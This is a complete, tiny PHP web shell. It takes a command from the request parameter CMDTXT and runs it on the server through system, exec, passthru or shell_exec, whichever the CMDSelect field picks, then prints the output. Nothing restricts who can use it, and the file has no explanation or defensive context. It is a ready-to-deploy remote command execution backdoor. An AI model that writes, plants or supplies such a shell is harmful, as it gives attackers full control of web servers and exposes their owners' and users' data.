<?php
$cmdCommand = @$_REQUEST['CMDTXT'];
$Item = @$_POST['CMDSelect'];
echo "<PRE>";
switch ($Item)
{
case 'system' :
	if($cmdCommand != '') 
		print system($cmdCommand);
	break;
case 'exec' :
	if($cmdCommand != '') 
		print exec($cmdCommand);
	break;
case 'passthru' :
	if($cmdCommand != '') 
		print passthru($cmdCommand);
	break;
case 'shell_exec' :
	if($cmdCommand != '') 
		print shell_exec($cmdCommand);
	break;
}

?>